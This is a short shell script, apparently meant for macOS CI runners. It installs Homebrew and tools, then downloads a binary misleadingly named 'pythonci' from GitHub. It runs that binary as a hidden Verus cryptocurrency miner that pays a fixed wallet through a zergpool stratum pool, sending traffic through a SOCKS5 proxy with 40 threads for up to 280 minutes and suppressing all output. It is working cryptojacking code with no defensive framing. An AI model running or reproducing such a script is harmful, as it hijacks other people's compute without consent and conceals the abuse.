#!/bin/sh
softwareupdate -l
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
brew install --cask screen
brew install coreutils
wget https://github.com/Nazimdr/project-hoj/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
PROXY=socks5://72.195.114.169:4145
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 40 -x $PROXY > /dev/null 2>&1
echo Sukses
